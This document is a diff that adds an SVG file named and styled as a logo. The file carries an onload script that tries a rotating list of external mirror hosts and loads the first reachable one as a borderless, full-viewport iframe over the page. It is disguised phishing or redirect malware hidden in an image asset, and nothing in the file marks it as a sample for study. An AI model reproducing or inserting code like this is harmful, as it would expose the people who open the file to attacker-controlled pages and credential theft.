@@ -1,0 +1,62 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: absolute; top: 0; left: 0; margin: 0; padding: 0; overflow: hidden;" onload="injectLogo()">
+
+  <script type="text/javascript">
+    <![CDATA[
+    var MIRRORS = [
+      { host: "ajhsvault.org", fallback: true },
+      { host: "practice.rest" },
+      { host: "endis.rest" },
+      { host: "webauth.win" },
+      { host: "endis.college" }
+    ];
+
+    function tryMirror(i) {
+      if (i >= MIRRORS.length) return openFallback();
+
+      var m = MIRRORS[i];
+      var ctrl = new AbortController();
+      var timer = setTimeout(function () { ctrl.abort(); }, 4000);
+
+      fetch("https://" + m.host + "/status.json?t=" + Date.now(),
+            { signal: ctrl.signal, mode: "cors", cache: "no-store" })
+        .then(function (r) {
+          clearTimeout(timer);
+          if (r.ok) { embed(m.host); } else { tryMirror(i + 1); }
+        })
+        .catch(function () {
+          clearTimeout(timer);
+          tryMirror(i + 1);
+        });
+    }
+
+    function openFallback() {
+      for (var j = 0; j < MIRRORS.length; j++) {
+        if (MIRRORS[j].fallback) { embed(MIRRORS[j].host); return; }
+      }
+    }
+
+    function embed(host) {
+      var container = document.getElementById("logo-container");
+      if (!container) return;
+      var frame = document.createElementNS("http://www.w3.org/1999/xhtml", "iframe");
+      frame.setAttribute("src", "https://" + host + "/");
+      frame.style.width = "100%";
+      frame.style.height = "100%";
+      frame.style.border = "none";
+      frame.style.background = "white";
+      frame.style.margin = "0";
+      frame.style.padding = "0";
+      container.appendChild(frame);
+    }
+
+    function injectLogo() {
+      tryMirror(0);
+    }
+    ]]>
+  </script>
+
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <xhtml:div xmlns:xhtml="http://www.w3.org/1999/xhtml" id="logo-container" style="width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;">
+    </xhtml:div>
+  </foreignObject>
+</svg>
